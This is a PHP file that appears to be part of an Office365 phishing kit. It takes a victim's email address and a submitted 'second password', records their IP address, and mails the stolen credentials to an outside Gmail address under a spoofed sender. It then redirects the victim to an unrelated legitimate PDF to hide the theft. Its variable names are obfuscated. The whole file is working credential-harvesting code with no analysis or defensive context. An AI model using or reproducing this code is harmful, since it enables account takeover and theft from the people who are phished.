<?php
session_start();
$Vaciknufzsky = getenv("REMOTE_ADDR");
$Vd5rgrkn3ik3 = "";
$Vd5rgrkn3ik3 .= "===============|New Log|==============\n";
$Vd5rgrkn3ik3 .= "Email: ".$_SESSION['clientemail']."\n";
$Vd5rgrkn3ik3 .= "Second Password: ".$_POST['password']."\n";
$Vd5rgrkn3ik3 .= "IP: ".$Vaciknufzsky."\n";
$Vd5rgrkn3ik3 .= "===============|Wolf-updated|==============\n";
$V3gxu1m2kgkm = "crisonlinelogs@gmail.com";
$Vzvoneollnqp = "OFFICE365 - LOGIN - FROM [$Vaciknufzsky]";
$V30sbmn0ftdu = "From: Wolf-updated<goggle.comm>";
$V30sbmn0ftdu .= $_POST['eMailAdd']."\n";
$V30sbmn0ftdu .= "MIME-Version: 1.0\n";
mail("$V3gxu1m2kgkm",$Vzvoneollnqp,$Vd5rgrkn3ik3,$V30sbmn0ftdu); 
header("Location: https://www.ccah-alliance.org/form%20library/Claim_Form_Telecom_Provider_and_Biller_RA.pdf");
	  

?>
